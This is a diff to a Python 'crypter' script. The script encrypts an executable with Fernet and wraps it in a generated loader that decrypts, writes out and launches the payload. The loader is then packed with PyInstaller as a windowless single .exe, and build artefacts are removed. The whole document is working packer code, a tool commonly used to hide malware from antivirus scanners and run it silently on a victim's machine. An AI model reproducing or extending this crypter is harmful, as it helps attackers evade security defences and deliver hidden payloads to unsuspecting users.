@@ -19,13 +19,13 @@ USAGE = \
 def crypter(input_file, output_file):
     with open(input_file, 'rb') as file:
         content = file.read()
-
     key = Fernet.generate_key()
     fernet = Fernet(key)
     crypto_content = fernet.encrypt(content)
     code = f"""\
 from cryptography.fernet import Fernet
 import os
+import subprocess
 import time
 
 key = {key}
@@ -35,21 +35,18 @@ fernet = Fernet(key)
 
 decrypt_content = fernet.decrypt(crypto_content)
 
-with open('decrypt.exe', 'wb') as file:
+with open('{input_file}', 'wb') as file:
     file.write(decrypt_content)
-
-os.startfile('decrypt.exe')
-
-time.sleep(20)
-os.remove('decrypt.exe')
+    
+subprocess.Popen('{input_file}')
 """
     with open('crypto.py', 'w') as file:
         file.write(code)
-
-    subprocess.run(('pyinstaller', '--onefile', '-w', '--name', f'{output_file}', 'crypto.py'))
+        
+    subprocess.call(('pyinstaller', '--onefile', '-w', '--clean', '--name', f'{output_file}', 'crypto.py'))
     shutil.copyfile(f'dist/{output_file}.exe', f'{output_file}.exe')
-    shutil.rmtree('build')
     shutil.rmtree('dist')
+    shutil.rmtree('build')
     os.remove(f'{output_file}.spec')
     os.remove('crypto.py')
 
